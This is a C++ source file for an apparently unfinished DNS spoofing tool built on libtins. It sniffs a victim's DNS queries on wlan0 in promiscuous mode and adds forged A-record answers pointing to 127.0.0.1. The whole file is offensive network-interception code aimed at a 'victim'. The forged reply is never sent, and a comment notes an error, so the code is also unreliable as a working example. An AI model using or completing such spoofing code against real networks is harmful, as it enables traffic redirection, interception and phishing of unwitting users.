//
// Created by root on 6/30/16.
//

#include "dns_spoofer.h"

DNS_Spoofer::DNS_Spoofer(char *_gateway, char *_victim, char *_server) : NW_Info(_gateway, _victim), m_server(_server) { }

void DNS_Spoofer::startSniffing() {
    std::clog << "[*] Ready to Sniffing " << std::endl;
    m_config.set_filter(std::string("udp and dst port 53"));
    m_config.set_promisc_mode(true);
    m_sniffer = Sniffer("wlan0", m_config);
    std::clog << "[*] Start Sniffing" << std::endl;
    m_sniffer.sniff_loop(make_sniffer_handler(this, &DNS_Spoofer::packetHandler));
}

bool DNS_Spoofer::packetHandler(PDU &pdu) {
    try {
        std::clog << "Packet Find" << std::endl;
        DNS dns = pdu.rfind_pdu<RawPDU>().to<DNS>();
        if(dns.type() == DNS::QUERY) {
            for (auto &query : dns.queries()) {
                if (query.query_type() == DNS::A) {
                    dns.add_answer(DNS::resource(query.dname(), "127.0.0.1", DNS::A, query.query_class(), 777)); // Error occured...    
                }
            }
        }
    } catch(std::runtime_error& error) {
        std::clog << "[*] Error Occured. Restart" << std::endl;
    }
    return true;
}